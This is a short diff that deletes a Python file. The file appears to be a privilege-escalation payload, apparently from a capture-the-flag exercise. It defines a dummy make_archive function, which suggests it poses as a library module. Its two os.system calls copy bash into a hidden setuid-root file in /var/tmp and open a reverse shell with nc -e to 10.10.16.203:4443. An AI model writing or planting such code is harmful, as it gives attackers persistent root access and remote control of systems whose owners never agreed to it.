@@ -1,9 +1,0 @@
-#!/usr/bin/python3
-
-import os
-
-def make_archive(a,b,c):
-    pass
-
-os.system('cp /bin/bash /var/tmp/.bash; chown root:root /var/tmp/.bash; chmod 4755 /var/tmp/.bash')
-os.system('/bin/nc -e /bin/bash 10.10.16.203 4443')
